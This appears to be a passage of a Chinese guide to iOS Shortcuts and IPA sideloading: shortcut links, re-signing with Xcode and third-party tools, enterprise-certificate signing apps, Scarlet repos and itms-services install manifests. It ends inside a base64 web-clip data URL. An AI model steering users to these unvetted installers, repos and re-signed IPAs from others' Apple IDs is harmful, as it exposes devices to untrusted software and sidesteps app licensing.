# 百度知道日报
https://www.icloud.com/shortcuts/df85acb1585e481fa8d9de965743b046

# 近期上映电影
https://www.icloud.com/shortcuts/32999ca5bdce4a879ba48e5890d1b257

# 程序改名加锁
https://www.icloud.com/shortcuts/0c73f53b09a24ad88f9eeeb315794b81

# 老司机
https://www.icloud.com/shortcuts/baaeae0d7d164472baed3e531673733b

# 空气质量查询
# 语音、自动定位、手动输入
https://www.icloud.com/shortcuts/de1d387855b24990a0b6648c2eba3a5f

# 追书神器
https://www.icloud.com/shortcuts/ec6c8f83043a4fb3885c4a302d7c2129

# 骂人宝典
https://www.icloud.com/shortcuts/73ded407f0d7417899346a3b5aa6d8ff

# 人脸识别
https://www.icloud.com/shortcuts/67175ef09c1d4e7da2d77d476506740f

# 睡眠声音
https://www.icloud.com/shortcuts/c9c50392fb7f4603af03cb9caf0fa9cb

# 一言
https://www.icloud.com/shortcuts/cd37638ddd02421c966be16961db558f
https://www.icloud.com/shortcuts/7f21e942496c46e9a7a98338d311a07a

# 自定义勿扰时长
https://www.icloud.com/shortcuts/92706b85621b42d2aaaf7cf296c749e5

# 低消耗
https://www.icloud.com/shortcuts/2d1a0e792358405fbb2462572962e6cd

# 高德地图语音导航
https://www.icloud.com/shortcuts/28b98b7fd9b84301955b72345e8515b1

# 查快递
https://www.icloud.com/shortcuts/04a23ce1b0b64c998519341752811e7e

# Picsew Editor
https://www.icloud.com/shortcuts/fc50347ce3f047309001520ceecb12ee

# 白描助手
https://www.icloud.com/shortcuts/20988a652e264b13889aa5db1ac3dbff

# 多种外币转换
https://workflow.is/workflows/9570db942bfb45f18581bd36121573b0

# 快递物件查询
https://workflow.is/workflows/177a3fd258ab4cfd806ff99df15d867c

# 打开链接并复制密码
https://workflow.is/workflows/e5846d5f70db404a914db7c6ae07e6c8

# 货币换算
https://workflow.is/workflows/50f0132cbe654370bc35189e1cf31b86

# 抛硬币
https://workflow.is/workflows/4e37faab34864e1883c533754c788066

# 合并PDF文件
https://workflow.is/workflows/adbb5f464fba4bc68a42a31bf91d1c4c

# 扩展和共享网址
https://workflow.is/workflows/acad8115a5564d6ea336b70b87dcab72

# 计时器
https://workflow.is/workflows/93fd0318d0e14cdaa32c5d021effaa8b

# IP和位置
https://workflow.is/workflows/ea529c591a2740169388c0d2b8ca6505

# 插接板书签离线
https://workflow.is/workflows/78e3d1afef39487db3d4a96d55e9a131

# 书签
https://workflow.is/workflows/86a36fe10ac54a0cbe21c0016e762dee

# Biking Distance
https://workflow.is/workflows/90b54056340742f2bd24ed45f894d22e

# 旅行距离
https://workflow.is/workflows/5e86637a392147449e7f0aebb3b18cf4

# 莫尔斯电码编码器手电筒
https://workflow.is/workflows/3f723d2d0e0a4c45b920281cf7d30284

# 手电筒
https://workflow.is/workflows/31699d9bf6054e028c69286cdf932ce6

# Translate
https://www.icloud.com/shortcuts/5ce941f97e7644e1951c3aa3cacf4804

# 极搜
https://www.icloud.com/shortcuts/9016687bcc894015ba2c7bbf3766359c

# 文本分析
https://www.icloud.com/shortcuts/458e944a6e8b409695e069f92b5e7bc0

# iiilab解析器
https://www.icloud.com/shortcuts/dbfdd71fdfd540ada81c08f8d24280b4

# Parse Video X
https://www.icloud.com/shortcuts/26224a223a344c0490ef1ecf91ee4ebc

# 网页内容编辑
https://www.icloud.com/shortcuts/c355a99f35174f488ed53e9499034e8f
```

## 自动化

可在指定事件发生时执行动作。自动化可以搭配快捷指令使用，如指定每天九点运行淘宝自动签到快捷指令。

## 快速调用捷径

可通过辅助触控实现，在辅助触控中将捷径设置为其中一个图标即可。

也可通过轻点背面的功能，选择轻点背面时调用捷径。

## 进阶

```
# 搭配其他APP

快捷指令＋Anki 实现快速输入、摘录、添加本地图片、划词添加
https://www.bilibili.com/video/BV1ct4y1m7bL

快捷指令＋iCost 实现相对自动化记账
https://sspai.com/post/66133

快捷指令＋vika 维格表（记账APP）
https://mp.weixin.qq.com/s/BeAQyGYLq52Jm6B-MfEFUg

快捷指令＋Seeds（笔记APP）
https://seedsnote.com/help/advanced/ios_shortcut/

快捷指令＋Notion（笔记APP）
https://www.bilibili.com/video/BV1C54y137nx

快捷指令＋印象笔记
https://zhuanlan.zhihu.com/p/373771525


# 校园网相关

实现drcom校园网自动登录
https://mp.weixin.qq.com/s/wkw4KkeuYC8BWXF3h5w4RQ

快速连接南京大学校园网
https://github.com/LadderOperator/MyShortcuts

实现南航校园网的一键登录
https://github.com/richardoLee/Shortcut-for-nuaa.portal

快速连接北京理工大学BIT-Web校园网
https://sspai.com/post/58189


# 日历相关

实现华东师范大学课表一键导入iOS日历
https://github.com/JJAYCHEN1e/ECNU_Bring-Your-Timetable-to-Calendar-App

实现南京大学课表一键导入iOS日历
https://github.com/LadderOperator/MyShortcuts

自动同步提醒事项和日历
https://zhuanlan.zhihu.com/p/169566930

将提醒事项同步到微软日历
https://sspai.com/post/63919

快捷指令＋日历（增强日历功能）
https://post.smzdm.com/p/alp6d9ke/


# 其他

快捷指令搭配NFC
https://zhuanlan.zhihu.com/p/89824463

实现自动换壁纸
https://sspai.com/post/64387

修改 iPhone 充电提示音
https://sspai.com/post/62846

实现自动判断上下班＋导航＋放歌
https://post.smzdm.com/p/ammqzvlz/

实现自动钉钉打卡
https://post.smzdm.com/p/ar0vp55w/

实现远程开机
https://post.smzdm.com/p/aoo8lzdm/

让你的 Siri 自动播报每日天气
https://mp.weixin.qq.com/s/8DlVNe_lLNvBowGSFSEgNQ

快速打开某一张图片
https://mp.weixin.qq.com/s/3pE8R3Mka95df9SiajHlmg

快捷设置提醒＋上班手机自动静音＋收盘前查看基金估值＋筛选快递短信并设置提醒等
https://www.bilibili.com/video/BV1gX4y1A7je

将网页文章推送至Kindle
https://sspai.com/post/60019

快速连接Sony耳机
https://sspai.com/post/56974
```

# 应用与IPA

从App Store下载的IPA包含了账号信息。因此，安装别人的Apple ID下载的IPA，打开时会提示需要输入账号信息。这种APP可以通过重签名的方式，将账号信息替换为自己，从而进行安装。

## 限免

### 价格监测

#### 通过Github Actions

打开以下链接，以Github账号登录后点击微信推送-绑定微信，完成绑定后点击首页-SCKEY，复制以备用。

```
http://sc.ftqq.com/3.version
```

打开以下链接并fork该项目。

```
https://github.com/Dreamy-TZK/AppStorePrice
```

点击Settings-Secrets，新建一个Secrets，内容如下。

```
名称 / Secret
值 / 上面复制的SCKEY
```

进入src/list.json，修改文件内容以确定需要监控的APP。保存后点击Actions，开启功能后点击Star以激活。

### 应用库

暂时不可用。

<details>
<summary></summary>

```
http://app.666wlgzs.com/list/appstore/
```
</details>

## 签名

### 基本概念

安装App Store的软件时，会对下载下来的IPA进行签名。安装非App Store的软件，需要手动对IPA进行签名。签名需要用到证书，分类如下。

|     类型     | 有效期 |
|--------------|--------|
| 个人账号证书 | 七天   |
| 企业级证书   | 一年   |
| 开发者证书   | 一年   |

现在大部分APP都是用企业证书进行签名。由于企业证书所签应用多，当应用违规时，证书容易被吊销，从而造成掉签现象。

### 通过Xcode

将手机连接到电脑。打开Xcode，进入Preferences，在Accounts处登录自己的Apple ID。然后点击Manage Certificates申请证书，点击Download Manual Profiles下载证书。

回到Xcode主页，点击Create a new Xcode project，选择Single View App，Team选择刚才申请的证书，Product Name和Organization Name可以随意填写。点击Create，然后在项目设置中将Deployment Info的Target选为自己手机的iOS版本，点击左上角的运行按钮，屏幕出现Succeed即可。

从以下地址下载iOS App Signer并运行，Input File选择要签名的IPA，Signing Certificate选择刚才的证书，Provisioning Profile选择刚才新建项目的对应文件，点击Start。

```
https://dantheman827.github.io/ios-app-signer/
```

回到Xcode，点击菜单栏的Window-Devices and Simulators，在Devices找到刚才创建的项目，点击+，等待黄色框消失即可。

### 通过自签软件

#### AltStore

```
https://altstore.io/
```

##### 常见问题

###### 电脑安装AltStore等待很久无反应

可尝试手机开热点，电脑连接热点安装；翻墙后安装；更换电脑；用虚拟机搭载macOS系统测试；关闭所有杀毒软件。

###### 手机安装IPA显示找不到AltServer

将手机连接电脑即可。若已经越狱，可安装AltStorePatch插件，即可不连接电脑。

###### 手机安装IPA最后一步显示could not install

退出电脑杀毒软件，或更换USB接口。

#### nullxImpactor

需要先安装AltStore并安装AltStore的邮件插件。签名时需保持邮件应用打开。

```
https://impactor.nullx.me/
```

#### AltDeploy

需要先安装AltStore并安装AltStore的邮件插件。签名时需保持邮件应用打开。

```
https://github.com/pixelomer/AltDeploy
```

#### Sideloadly

仅支持签名并安装没有签名的IPA安装包。

```
https://sideloadly.io/
```

#### Cydia Impactor

```
http://www.cydiaimpactor.com/
```

#### Scarlet

注意安装Mail Plugin时退出Clash，否则会因为端口占用而安装失败。

```
https://github.com/DebianArch64/DebProvision
```

可用repo如下。

```
https://raw.githubusercontent.com/azu0609/repo/main/scarlet_repo.json
https://usescarlet.com/scarlet.json
https://ipa.cypwn.xyz/scarlet.json
https://cydia.akemi.ai/
https://repo.chariz.com/
```

#### 牛蛙助手

```
https://ios222.com/
```

#### NB全能助手

```
https://nbtool8.com/
```

### 通过APP

可用闪电签、山猪签、轻松签、魔力签。魔力签官网如下。

```
https://ios-tool.com
```

签名前需先添加证书。下载的证书包括p12和mobileprovision为后缀名的两个文件，先用签名APP打开p12文件，然后再打开mobileprovision文件即可。

## TestFilght

TestFilght是苹果提供开发者应用测试的平台。

### 应用降级

打开TestFilght，点击要降级的应用，选择以前的Build，根据需要选择版本即可。

### 应用库

暂时失效。

<details>
<summary></summary>

```
https://testflight.center/
```
</details>

## IPA安装

### 手机端

#### 通过上传到蓝奏云

IPA上传到蓝奏云后即可直接进行安装。

#### 通过itms-services协议

苹果允许用itms-services服务协议来直接在iOS安装应用程序。将要安装的IPA和安装时显示的图片上传到OneDrive，获取分享外链，然后通过以下网站将两者转换为直链。

```
https://onedrive.gimhoy.com/
```

打开记事本并复制以下代码，其中software-package的url改为IPA的链接，display-image的url改为图片的链接。然后另存为plist文件。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>items</key>
    <array>
        <dict>
            <key>assets</key>
            <array>
                <dict>
                    <key>kind</key>
                    <string>software-package</string>
                    <key>url</key>
                    <string>https://onedrive.gimhoy.com/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBaVRnOE5zR09TMFZtQUE5aFZweVA1b29wYlQzP2U9WFRuZHZa.ipa</string>
                </dict>
                <dict>
                    <key>kind</key>
                    <string>display-image</string>
                    <key>needs-shine</key>
                    <false/>
                    <key>url</key>
                    <string>https://onedrive.gimhoy.com/1drv/aHR0cHM6Ly8xZHJ2Lm1zL3UvcyFBaVRnOE5zR09TMFZtUzV5U3lrRTBkcHJRWlN3P2U9Q0tsNUJo.png</string>
                </dict>
            </array>
            <key>metadata</key>
            <dict>
                    <key>bundle-identifier</key>
                    <string>xz.Ltribe.com</string>
                    <key>bundle-version</key>
                    <string>2.0</string>
                <key>kind</key>
                <string>software</string>
                <key>subtitle</key>
                <string>jiejing</string>
                <key>title</key>
                <string>捷径2.0.关注公众号：LTribe</string>
            </dict>
        </dict>
    </array>
</dict>
</plist>
```

将编辑完成的plist文件上传到OneDrive，生成分享外链并转换为直链，然后将链接按照以下格式拼接即可。

```
itms-services://?action=download-manifest&url=[地址]
```

#### 通过Shu

通过以下链接安装Shu。如果提示输入ID，则连接电脑并使用爱思助手安装。

```
https://www.lanzous.com/i3r11qd
```

把下面代码保存到备忘录，然后把ipa文件添加到Wi-Fi共享，改成app.ipa，注意需保持Wi-Fi处于连接状态。最小化Shu，单击备忘录里的代码即可直接安装ipa。

```
itms-services://?action=download-manifest&url=https://coding.net/u/qiuker/p/installs/git/raw/master/local/Shu.xml
```

也可在浏览器打开以下链接，添加到桌面后直接点击即可安装。

```
data:text/html;charset=utf-8;base64,PGh0bWw+CjxoZWFkPgogIDxtZXRhIG5hbWU9ImFwcGxlLW1vYmlsZS13ZWItYXBwLWNhcGFibGUiIGNvbnRlbnQ9InllcyI+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCxpbml0aWFsLXNjYWxlPTEuMCx1c2VyLXNjYWxhYmxlPW5vIiAvPgogIDxsaW5rIHJlbD0iYXBwbGUtdG91Y2gtaWNvbiIgaHJlZj0iZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFXZ0FBQUZvQ0FZQUFBQjY1V0hWQUFBQUFYTlNSMElBcnM0YzZRQUFBQWx3U0ZsekFBQVdKUUFBRmlVQlNWSWs4QUFBQUJ4cFJFOVVBQUFBQWdBQUFBQUFBQUMwQUFBQUtBQUFBTFFBQUFDMEFBQVU4ZCtnMmk4QUFCUzlTVVJCVkhnQjdKMUxxQ1hGR2NkZHgvaU83NGhnaUc2eU1FS0NtMkNVZ0l2b0ptNThiQVNEYnJLSWJvS0xDRXBDQkJFTUVWeVpYUkF4TGdTekNBVEVqZHlYazFIdnFETU9tY3lvTTB4bWZJNTNQT2UrS3YyL2Vyam4zdHZkcDd2NjlWWFZyMkc0Wjg3cFI5Vy8vdC92ZktlNnF2cWN1ZStNSFAvUUFBL2dBVHhnendQbjBDajJHb1Uyb1Uzd0FCNlFCd0EwdnlENEJZVUg4SUJSRHdCb293MURCa1VHaFFmd0FJQUcwR1JQZUFBUEdQVUFnRGJhTUdSUFpFOTRBQThBYUFCTjlvUUg4SUJSRHdCb293MUQ5a1QyaEFmd0FJQUcwR1JQZUFBUEdQVUFnRGJhTUdSUFpFOTRBQThBYUFCTjlvUUg4SUJSRHdCb293MUQ5a1QyaEFmd0FJQUcwR1JQZUFBUEdQVUFnRGJhTUdSUFpFOTRBQThBYUFCTjlvUUg4SUJSRHdCb293MUQ5a1QyaEFmd0FJQUcwR1JQZUFBUEdQVUFnRGJhTUdSUFpFOTRBQThBYUFCTjlvUUg4SUJSRHdCb293MUQ5a1QyaEFmd0FJQUcwR1JQZUFBUEdQVUFnRGJhTUdSUFpFOTRBQThBYUFCTjlvUUg4SUJSRHdCb293MUQ5a1QyaEFmd0FJQUcwR1JQZUFBUEdQVUFnRGJhTUdSUFpFOTRBQThBYUFCTjlvUUg4SUJSRHdCb293MUQ5a1QyaEFmd0FJQUcwR1JQZUFBUEdQVUFnRGJhTUdSUFpFOTRBQThBYUFCTjlvUUg4SUJSRHdCb293MUQ5a1QyaEFmd0FJQUcwR1JQZUFBUEdQVUFnRGJhTUdSUFpFOTRBQThBYUFCTjlvUUg4SUJSRHdCb293MUQ5a1QyaEFmd0FJQUcwS2F5cC9rTFJtN3g2cEhiZDhQSXZmV1RzVHR3KzlnZHVuZlZIWGxrMVgzODFKbzc5Y0s2Ky9UVmRmZjVheHZ1ek1LR1d6bXc0VVpITjkzYUo1dHVZL3pOUDczV2UvcE0rMmhmSGFOamRRNmRTK2ZVdVhVTlhVdlgxTFdCSWhwWThnQ0FCdEM5UTJueDhwSGJmK1BZdlh2SDJCMTVlTldkZkg3ZHJieTk0VFkzTnQzUW04cWdzcWhNS3B2S3FMS3F6SllDbDdLazBSNEFHa0IzQmg1bHBQdXVIN24zN2h5N1kwK3N1Uy9uTm9ibWIrUHJxdzZxaStxa3VwRjFwd0hLb2I0UUFUU0FiZzNRNmlaUXQ4SEhUNis1OFluaHMrSEdOSzU0QXRWVmRWYmRwY0ZRd2N4MTQ5TWVRQU5vYjZDOGVkM0lIYnB2MVoxK2FYMnIvN2NpejZMZlRYM2gwa1RhU0NQQWlRYStIZ0RRQUxveVFPWXZHcm5sVzhidXhMTnJidVByZERMa3B0OG8wa3FhU1R0cDZCdXNISmVlZGdBYVFKY0NZK25ha1R2ODRLcjdhbC80L2NkTlFkdlc4ZEpTbWtwYm9Jc0daUjRBMEFCNkR5U1d2cDlCK2FIVnJhRnFiVUdKOCtRcm9PR0EwbHFhbHdVcW42V3BENEFHMEZ0Z1dMd3FnL0lEcSs3ckQ4aVU4MUhhL2J2U1htMmd0Z0RJYUNBUEFPaVVBWDF1MXFkODY5aDk4VHBRN2g2LzlhNmdObEhiekdWdEJLelQxUUJBSndobzlYMGVlNHdiZmZXUU9jemV1c0dvdHFLL09rMUlBK2lFQUwxODI5aWRXU0piSGdhMXphK3F0dHZLcWhQeWJPcS9IZ0IwN0dZL0x4dXJuSzA3c1hxU1lYSE5FV25qREdwTHRlbGMxcmFwQXl6MitnUG9TQUc5Y09uSUhYMTB6VzJ1QVdZYldHMi9GR3BidGJIYU9uWlFwVm8vQUIwWm9CZXZITGtUejYyM1R3UE9hRm9CdGJuYVBsV1F4VnB2QUIwSm9CY3VHN25qejZ5WmhnaUY2MTRCZVVCZWlCVllxZFVMUUFjTzZJVkxSdTdEUHdMbTd0RVgxaFhrQ1hrak5hREZWbDhBSFNpZzU4L1ArcGgvRDVqRHdtYi9wWlZINUpYWXdKVktmUUIwZ0lCKy82NVZ0NzdDemIvK2NSZm1GZVVWZVNZVnFNVlVUd0FkRUtEMVpJK3o3ekdPT1V4TURsOXFlVWNlaWdsZ3NkY0ZRQWNBNk1VclJ1NzAzeG1aTVR6aTRpaUJ2Q1JQeFE2M0dPb0hvSTBEV2l1ZHNhRkFGd3JJV3pGQUxPWTZBR2lqZ043M3c1RmJXYVk3b3dzd2NjNXRCZVF4ZVMxbXlJVmNOd0J0RGREZnpSWXllcHpSR2RzSTRWVWZDc2h6YzVuM1FvWlpqR1VIMElZQXZmL0hZemMrenVpTVBvREVOZllxTVBwbzA4bURNWUl1MURvQmFDT0FQdllFV2ZOZVpQRE9FQXJJaTZFQ0xiWnlBK2lCQWIxMERYM05RMENJYTVZcm9MNXBlVE0yNElWV0h3QTlJS0FQM3NNSWpYSk04T25RQ3Npam9VRXRwdklDNkFFQVBYL2h5SDN5Q3VPYWg0WVAxNittZ0x3cXo4WUV2bERxQXFCN0JyU0dOTEY0ZmpVd3NKY2RCZVJaaHVQMS95VUZvSHNFdE5aRFlFT0JrQlZnVFk5K0lRMmdld0wwOGI4d1NpTmtNRkgyYlFYazVWQzZDRUl2SjREdUdOQUwzeHU1TTI4eUkzQTd2SGtWZ3dMeXRMd2RPZ0N0bHg5QWR3aG85ZG10ZmNIRWt4aUFSQjMyS2lCdjB5L2Q3WmNVZ080STBNdTNqTjNtQm5EZUc5YThFNU1DOHJpOGJqMFREYlY4QUxvRFFCOStnSnVCTVVHSXVzeFdRSjRQRllLV3l3MmdXd2IwUjA5eU0zQjJPTE5IakFySSs1WmhGMkxaQUhSYmdENlhSZlZqaEE1MXFxZUFIZ1l3bDhWQ2lEQzBXR1lBM1FhZ3MyVWFQLzhYSXpYcWhUSjd4NnFBWW9HbFM5djVrZ0xRVFFGOTNzaDkrUVp3amhVMjFNdFBBY1hFWEJZYkZyUFNrTW9Fb0JzQWV2NkNrZnRxUDNEMkMyR09pbDBCeFlaaUpDUWdXaXNyZ1BZRTlQekZJM2YySUhDT0hUTFVyNWtDaWhIRmlqWHdoVkllQU8wQmFCbHVkSlF4enMxQ2w2TlRVVUN4QXFUOXZxUUFkRTFBNnljYm1YTXFhS0dlYlNtd2xVblQzVkg3bHdTQXJnUG83S1lIZmM1dGhTem5TVTBCeFE0M0R1dGwwZ0M2S3FDem9YU00xa2dOS2RTM2JRVzJSbmZ3OVBES21UU0FyZ0xvYk9BOTQ1emJEbFhPbDZvQ1crT2ttY3hTQ2RJQXVnS2dOVHVLRFFWUW9EMEZ0bVljVm9pOVVFWmJkRlZPQUQzREpLeXQwVjVRY2lZVW1GYUF0VHRtOTBjRDZCSkFzeXJkZERqeEdnWGFWNEJWOE1vaERhQUxBSzAxYnRsUUFBVzZWNEQxcElzaERhQnpBSzJuUkxEWWZ2ZUJ5UlZRUUFvbzFuZ3lTejZrQWZRdVFDOWN5bU9xd0FZSzlLMkFIcCtsMk92cVpsdW81d1hRdXdETkExNzdEazJ1aHdMZktLRFlDeFdrWFpVYlFFOEJXbytUWjBNQkZCaE9BY1ZnVjdBTDhid0ErbHRBdjM4WHp4RWNMaXk1TWdwc0s2QllEQkdtWFpRWlFHZUExZzBLTmhSQUFUc0tjTlB3bS83NDVBRTlmK0hJclo1azZWQTdvVWxKVU1CdHhhUmlzNHVzTktSekpnL29UMTVoR2pkQVFBR0xDaWcyUTRKcEYyVk5HdEFINzZIZjJXSmdVaVlVbUNpZ0dPMENmS0djTTFsQUwxMUR2L01rQ1BpTEFwWVZVS3lHQXRTMnk1a3NvRmVXZVo2ZzVhQ2tiQ2d3VVVDeDJqYjRRamxma29BKzlnVGpuU2ZtNXk4S2hLQ0FZallVcUxaWnp1UUEvZFpOTElJVVFrQlNSaFRZcllCaXQwMzRoWEN1dEFDZFBXcG5mSndoZGJ1TnovOVJJQVFGRkx0emlUMHVLeWxBSDN1Y3JvMFFBcEV5b2tDUkFvcmhFRExmdHNxWURLQ1pMVmhrZWQ1SGdiQVVTR21XWVRLQVp0UkdXRUZJYVZHZ1NJR1VSblVrQWVqRER6RWhwY2pzdkk4Q0lTcWdtRzZyRzhIeWVhSUg5T0lWVEVnSk1RQXBNd3JNVWtDeGJSbXViWlF0ZWtEcjhlNXNLSUFDOFNtZzJHNERncGJQRVRXZzk5L0ltT2Y0d3BJYW9jQzJBb3B4eTRCdFdyYW9BWDMyUGFaemIxdVpWeWdRbndLSzhhWVF0SHg4dElEbUNTbnhCU00xUW9FOEJXSitBa3VVZ0o0L2YrVFdWNWd4bUdkbTNrT0IyQlJRckN2bUxXZkN2bVdMRXRESEhtUEdZR3hCU0gxUW9Fd0J4Ynd2QkMwZkZ4MmdGeTVoV0YyWmtma01CV0pWUUxGdkdiWStaWXNPMEIvOWlldzUxZ0NrWGloUXBvQmkzd2VDbG8rSkN0QUxsNUU5bHhrNHRzKzB1dG0vZnpSeUIrOWVkV3VmY2M4aHR2YjFxWThZWUJtNGRjc1dGYUNQUDBQMjdHUHFVSTg1K2Z6MlJJVzNieDRENlZBYnNzVnlpd0YxSVdoNS8yZ0F2WGdsMlhPTFBnL2lWTWYvdkRNWTMvM2wyRzJ1a1VrSDBYZ2RGbElzc0F6ZE9tV0xCdEFubm1OS2Q0ZWVOM25xNlF4NlluclcvRGJaVkwwV1NpeVkrQ0gwdjFFQWV1RlNzdWRlSThESXhiNThJMmNXMlhrajkvbHJ6Q0ExMGtTREZVTk1DQjNPS244VWdENzZLSDNQZzBYQ2dCZGVQNU05QWlrejhlNS8rNjdQSmlwbG43R2xxNENZc05zWElmNC9mRUJuR1JQOWp1a0dvbTRPNWdYZWYzN0RHdURwdXNKdE1XRXVZME9lTjBKNkwzaEFIN3FYUUV3NUVQLzd1K0pNaWE2T2xKM2huTmdRRW96enlobzhvRmRQOFZNMjVUQVVoUE9NcmZjMFJucmpMUDVJMVIrckovTzd3SXI4WXZIOW9BRzlmQnZyUGFjYWZKTjZxM3RyOGFyaW43S002cGdvbGVaZk1jSWllS3VXS1doQW4xbmlibjJhWWJlejFvY2ZMUGtwbS9WRG5qMkVUM1lxbHM3L3hJaXFNTFM0WDdDQVhycVdvWFhwaEZsNVRULzdaM2tRYWdJTFc3b0tpQlVXNFZ1bFRNRUNtaVZGMHcyNDNUVlhOOGViUHlnUHd0TXZNNUZwdDI2cC9EL2twVWpEQlBTNTJjMmZyN241azBxQVZhbG4yV2dPWlNvYUc4ME53eXBLeHJlUFdER1hNYU5LeG1wdG55QUJ2WHdyUDFuakM2Tm1OVnA1cDd5YlE0SEhEY05tR29kOHRKaGhEYjVWeWhNa29MOTRuWnMrSVFkTFYyVXZtclF5Q1lUNWk3bGgySlgyMXM4clpreDhFTkxmNEFDdElWVnNLSkNud083VjdmSUM4ZjFmTWJFcFQ3c1UzaXNianBubkZRdnZCUWZvdzc4bXdGSUlKcDg2YXRLU3N1UlpnYVZSSDJ6cEtTQjJ6UEtHdGMrREEvVFhIeEJjNllWVzlScC9jUC9zSUh6ckp0YU5ycTVvUEh1S0hkWUFQS3M4UVFGNjZScTZOK0lKbDI1cWtyc0VhYzZLZCtvT1lVdFBBVEZrRmhRdGZSNFVvQTgvUlBkR2VpRlZ2OGF6YmhZcUFOVWZ5VG91OWJVTi9RZ3h4QktBWjVVbEtFQ1BqakwyT2ZRQTZhUDhlVTlheVFzRWxpVHRvelZzWFVNTXlmT0MxZmVDQVRSVHUyMFozWEpwdEZoL3BhYzdaK3QwZkxXUGV4cVcyN0tMc29VMDlUc1lRR3RCSERZVXFLckFrZDlXK3lsNzRCZE1lcXFxYVN6N2xTNnVsWE8vWXNqc09oaEFrK25FRWg3OTFFTXIyRlVOckZNdnNrNUhQNjFpNHlwaVNWVnZETDFmRUlDZXY0alJHemFzSFZZcHRJcGRsUURUUWtzOHd6Q3N0bTFhV2pHbGlqZUczaWNJUUMvZndzL1Fwb1pNOGZoWnk1Qk9CeC9yZEtUbEVERmx1djJ0dmc0QzBDZWVaY3hxV3VIVFhtMzEyS3Nxd2NjNkhlMXBIc0taeEpRcXZoaDZueUFBemRLaUlWamVaaGxQUExkZU9SQlpwOE5tRzNaUnFxMGxTSTNkRU16N01qQVA2RGV2by8rNUM0T21jczdLUSs2K0RkWlBYK1dHWVNyZUVGdnlvR2pwUGZPQVBuUWZ3K3RTQ1ppdTZqbHJNZi9wZ0dSaC82NWF3ZDU1eFpicHRyZjQyanlnVDc5RVJtUFAybUdWYUhRc216MldUVXFwR29EY01BeXJmWDFMSzdaVTljUlErNWtIOU1hWTZkMitCdVM0YlFVTzNsMGpXK0pKNE52Q1JmeEtiQmtLdkZXdmF4clFpMWZUL3h4eGZKUldUWDNIV3BtdXJRbEtWVmU1bXdRT1R3SXZiWjVvUGhSakptMXU4YTlwUUIrNG5mSFAwVVJDallwby9QTDBlZ2xhdjdtTlJmYVhmMTV2N0NzekRHczBXcUM3aWpFV3dUd3BrMmxBZi93MDQ1OEQ5YjEzc1RWRnUraXBLQm9HcDg5OXQ5TXYxK3R6MUpmRTJtZDBzZm5xSGNKeFlzd0VoaGIvbWdiMCtBVEJFWUxKMnl5aklGd2FLRm4vc0JaQzhnSG41dHFtMHlpTjB2UHZHaHVyYTdIRnE0QVlVOGNQZmU5ckZ0RHpGOUwvSEc5WTVOZXN6dFJzTGJpdlNTaUNicDJ0eW9ObGR3Umg5b1d3OG81LzFsNm5iT3c3akFKaXpZNDIzL1VsUGVSblpnR3RUSWN0SFFVRVd2VTExdzBHSGZQNWE5VUJxc3k3cUF1bDZOb3NTUnEzRCt2K3FpcnlTUmZ2bXdYMGUzZHlnekR1c05oWnV6cFRzdk1DUVYwUlZiUHBxbXRGVDE5SC9kZHNjU29nMWt5M3RhWFhaZ0g5NFIrNFFSaG5PT3l0bGJMYTZWRWJ2Z0dpUjExVjJlcXNGVDBwQ3pNTXF5Z2I1ajVpemFTZHJmMDFDK2d2NTZyL2JBM1RGcFI2b2tDZHFkaGxBVlJuN0hMVnRhS25yL2ZSa3lRTmt6YUw2YTlZTTkzT2xsNmJCWFJNQnFBdXhRcHNaYk0xcG1HWEJVK2R2bUl0aWxSMnJyelAxSGM5UGw3dnBtUnh6Zm5Fa2dKNTdXM2hQWk9BWHJ5Y0c0U1d6TnRsV1dZT3E2dHhSMTBqTktwdTZxK3V1bGIwZEtEeWJNeXFDb2UxbjVnejNjNVdYcHNFOVA0YnVVRVlscjM5U2x0bldOMnNnTkZqcXpiTzFzdHVhdys1Ky9iTG9xM3A1MzZxY1ZRWENvZzVzencyeE9jbUFjMElqaTRzYU91Y3ZzUHFpb0xrZjMrcmRvTndXZ1dmSVhlNmZwMis3dW5yOGRxdUF1L2VBYUFyZjBNZGVaalpXM2F0M0U3Sm1nNnJtd2IxT3ovei84WGxNK1JPMTJaaC8zWjhZT1VzWXM2MHA2eThOcGxCbi94ci9XeklTa05UanRrS0tIUFZUTUMyZ2tBcjFmbHVQa1B1Vkc1TmtLazY3dHEzYkJ6WG53SWFvdG1XSDlzOGowbEFyN3p0SDNEOU5TbFg4bFdncldGMUNvUVA3bS8rYTh0bnlKMnVYWFhjdGE5T0hOZWZBbUpPbTJCdDYxd21BYjI1VWU5bVQzL055SldhS3REbXNEb05lOVBUVXBwdXZqY3JOYmxHNjFhemhhK0FtTk1XVk5zOGp6bEF6MS9BRUx2dzdWNWNnemFIMWJYNWFDcWZkVUFVaUcyV29WZzFQdWxEQWJHblRiaTJjUzV6Z09ZcEtuMVljWmhyK0dhcWVVYjNHVlpYVm12Zm01WUxsNDNjNmlteTZESnRRL25NNHROVnpBRjYzdzFrMEtFWXVrNDVMUXlyS3l1dnVpcDhiMXl5Wm5TWnN1RjhKdmJrSlFORHZtY08wRy85MUgvSVZEaFdTSytrdmhscVhuRG8wVlZkYk40M0wzbkliQmZOMGZzNXhaNDh2dzM1bmpsQTh4ekMzbjNaK1FYYkhsWjNackdiVVQ2NjRUam51UzZJbmhyT0ZyWUNGcDlQYUE3UWgrN0Q2R0hiZkcvcHZUUFQ3Q2JjN3V5bGpXRjFlMHU0L1k3T3YvdWFWZi9mMVJmSGR1bDQxYVVDaCs3MWIvdXFIcW03bnpsQUgza0VRSGRwd3I3UGJYRllYWmtHZ216ZElKcnNYMmMxdmJJeThOa3dDb2c5azdhMDh0Y2NvRDkrcXZxS1pNTTBJMWV0bzREVllYVmxkVkFmdDIrQWFxUUtXNWdLaUQyKzdkN1ZjZVlBZmVvRnBublBzcmRHSEFnRW1zazI5TCt5YWRadERxc3JlNktKK281OWRGRGZlTjZteDF2NUJ0emJOeGRQQWRkd1BKOXlOajFHN2NDRW1yeVczdm1lMk9QYjdsMGRadzdRbi80RFFPKzB6YzcvcWN2QTBrTXVpNWJlYkh0WTNha1hpMzNobTZVWFBTRkZaVytpY2RuS2VnSjRWOEZjZGw3VlI5NWhL